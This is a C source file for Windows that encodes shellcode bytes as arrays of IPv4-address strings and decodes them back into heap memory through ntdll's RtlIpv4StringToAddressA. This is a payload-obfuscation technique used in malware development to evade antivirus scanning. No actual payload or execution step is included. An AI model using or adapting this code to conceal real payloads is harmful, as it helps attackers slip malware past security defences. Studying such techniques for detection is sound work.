#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "ipv4.h"

char* GenerateIpv4(int a, int b, int c, int d) {
    char* Output = (char*)malloc(16 * sizeof(char)); // Allocation mémoire
    if (!Output) return NULL; // Vérifier l'allocation
    sprintf_s(Output, 16, "%d.%d.%d.%d", a, b, c, d);
    return Output;
}

BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    if (pShellcode == 0 || ShellcodeSize == 0) {
        return FALSE;
    }

    // If ShellcodeSize is not a multiple of 4, pad it.
    if (ShellcodeSize % 4 != 0) {
        unsigned char* paddedShellcode = NULL;
        SIZE_T paddedSize = 0;
        if (!PaddBuffer4(pShellcode, ShellcodeSize, &paddedShellcode, &paddedSize)) {
            return FALSE;
        }
        pShellcode = paddedShellcode;
        ShellcodeSize = paddedSize;
    }

    printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

    int counter = 0;
    for (SIZE_T i = 0; i < ShellcodeSize; i += 4) {
        char* IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);
        if (!IP) return FALSE; // Vérification de l'allocation mémoire

        printf("\"%s\"", IP);
        free(IP); // Libérer la mémoire

        if (i < ShellcodeSize - 4) {
            printf(", ");
        }

        counter++;
        if (counter % 8 == 0) {
            printf("\n\t");
        }
    }

    printf("\n};\n\n");
    return TRUE;
}

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(PCSTR S, BOOLEAN Strict, PCSTR* Terminator, PVOID Addr);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    if (!Ipv4Array || !ppDAddress || !pDSize) return FALSE;

    PBYTE pBuffer = NULL, TmpBuffer = NULL;
    SIZE_T sBuffSize = NmbrOfElements * 4;
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA =
        (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "RtlIpv4StringToAddressA");

    if (!pRtlIpv4StringToAddressA) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (!pBuffer) {
        printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;
    for (SIZE_T i = 0; i < NmbrOfElements; i++) {
        STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer);
        if (STATUS != 0x0) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%08X\n", Ipv4Array[i], STATUS);
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return FALSE;
        }
        TmpBuffer += 4;
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

BOOL PaddBuffer4(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {
    // Round up the size to the next multiple of 4
    SIZE_T PaddedSize = InputBufferSize + 4 - (InputBufferSize % 4); // Align to the next multiple of 4
    PBYTE PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
    if (!PaddedBuffer) {
        return FALSE;
    }

    ZeroMemory(PaddedBuffer, PaddedSize); // Clean the buffer
    memcpy(PaddedBuffer, InputBuffer, InputBufferSize); // Copy the original data

    *OutputPaddedBuffer = PaddedBuffer;
    *OutputPaddedSize = PaddedSize;

    return TRUE;
}
